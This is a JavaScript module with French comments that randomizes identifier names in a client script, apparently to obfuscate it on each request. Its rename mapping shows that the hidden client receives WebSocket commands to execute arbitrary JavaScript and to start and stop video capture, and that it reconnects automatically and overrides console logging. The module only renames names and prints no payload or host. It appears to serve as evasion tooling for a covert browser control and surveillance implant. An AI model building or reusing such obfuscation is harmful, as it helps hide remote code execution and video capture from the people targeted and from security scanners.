/**
 * Générateur de noms de variables aléatoires pour l'obfuscation
 */
class VariableRandomizer {
  /**
   * Génère une chaîne aléatoire
   * @param {number} minLength - Longueur minimale
   * @param {number} maxLength - Longueur maximale
   * @returns {string} Chaîne aléatoire
   */
  static generateRandomString(minLength = 8, maxLength = 15) {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    const numbers = '0123456789';
    let result = '';

    // Commence toujours par une lettre
    result += chars.charAt(Math.floor(Math.random() * chars.length));

    // Ajoute des caractères aléatoires
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    for (let i = 1; i < length; i++) {
      const allChars = chars + numbers;
      result += allChars.charAt(Math.floor(Math.random() * allChars.length));
    }

    return result;
  }

  /**
   * Génère un mapping complet de noms de variables randomisés
   * @returns {Object} Mapping oldName -> newName
   */
  static generateMapping() {
    return {
      // Noms de classes
      ClientNet3m8w: this.generateRandomString(),

      // Propriétés de la classe
      urlServer9k2v: this.generateRandomString(),
      socketConn7x1q: this.generateRandomString(),
      userIdent4z8n: this.generateRandomString(),
      retryCount5p3j: this.generateRandomString(),
      maxRetries6h9l: this.generateRandomString(),
      pingTimer8w4r: this.generateRandomString(),
      streamVideo2y7s: this.generateRandomString(),
      intervalVideo9n5t: this.generateRandomString(),

      // Méthodes de la classe
      connect: this.generateRandomString(),
      sendMessage: this.generateRandomString(),
      startPing: this.generateRandomString(),
      stopPing: this.generateRandomString(),
      attemptReconnect: this.generateRandomString(),
      disconnect: this.generateRandomString(),
      startVideoCapture: this.generateRandomString(),
      stopVideoCapture: this.generateRandomString(),

      // Variables globales
      URL_CONFIG_Q4R7: this.generateRandomString(),
      clientInstance5x3m: this.generateRandomString(),

      // Variables locales
      message: this.generateRandomString(),
      event: this.generateRandomString(),
      result: this.generateRandomString(),
      executeError: this.generateRandomString(),
      error: this.generateRandomString(),
      delay: this.generateRandomString(),

      // Propriétés des messages WebSocket
      type: this.generateRandomString(),
      welcome: this.generateRandomString(),
      uuid: this.generateRandomString(),
      execute_js: this.generateRandomString(),
      code: this.generateRandomString(),
      success: this.generateRandomString(),
      timestamp: this.generateRandomString(),
      js_executed: this.generateRandomString(),
      start_video: this.generateRandomString(),
      stop_video: this.generateRandomString(),
      ping: this.generateRandomString(),

      // Méthodes WebSocket
      onopen: this.generateRandomString(),
      onmessage: this.generateRandomString(),
      onclose: this.generateRandomString(),
      onerror: this.generateRandomString(),
      readyState: this.generateRandomString(),

      // Note: Les objets globaux du navigateur (window, console, document, etc.) 
      // ne doivent PAS être randomisés car ils sont des APIs natives du navigateur

      // Fonctions de l'interface homepage
      toggleDebug: this.generateRandomString(),
      updateConnectionStatus: this.generateRandomString(),
      addDebugLog: this.generateRandomString(),
      debugVisible: this.generateRandomString(),
      originalLog: this.generateRandomString(),
      originalError: this.generateRandomString(),
      originalConnect: this.generateRandomString()
    };
  }

  /**
   * Applique la randomisation sur le code
   * @param {string} code - Code source à modifier
   * @param {Object} mapping - Mapping des noms de variables
   * @param {Object} _req - Objet de requête (ignoré pour URL fixe)
   * @returns {string} Code modifié
   */
  static applyRandomization(code, mapping, _req) {
    let modifiedCode = code;

    // Note: URL fixe maintenant - plus de remplacement dynamique
    // L'URL reste statique comme configurée dans le code client

    // Appliquer le mapping des variables
    for (const [oldName, newName] of Object.entries(mapping)) {
      const regex = new RegExp(`\\b${oldName}\\b`, 'g');
      modifiedCode = modifiedCode.replace(regex, newName);
    }

    return modifiedCode;
  }
}

module.exports = VariableRandomizer;